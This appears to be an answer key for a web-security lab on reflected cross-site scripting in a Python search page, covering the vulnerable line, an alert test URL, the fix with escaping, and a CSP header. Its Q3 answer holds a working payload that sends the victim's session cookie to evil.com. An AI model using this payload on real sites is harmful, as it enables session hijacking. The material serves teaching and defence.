# Lab 02 Answers

## Q1 — Vulnerable line

```python
return f"<h2>Results for: {query}</h2>"
```

User input `query` is inserted raw into HTML — no escaping.

## Q2 — Attack URL

```
/search?q=<script>alert('hacked')</script>
```

## Q3 — Real attack

```javascript
<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>
```

This sends the victim's session cookie to an attacker-controlled server, letting them hijack the session.

## Q4 — Fix

```python
from markupsafe import escape
return make_response(f"<h2>Results for: {escape(q)}</h2><p>No results found.</p>")
```

`escape()` converts `<` to `&lt;`, `>` to `&gt;`, etc. so the browser renders them as text instead of executing HTML/JS.

## Q5 — Extra defense header

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Blocks inline scripts from executing even if an XSS payload slips through.
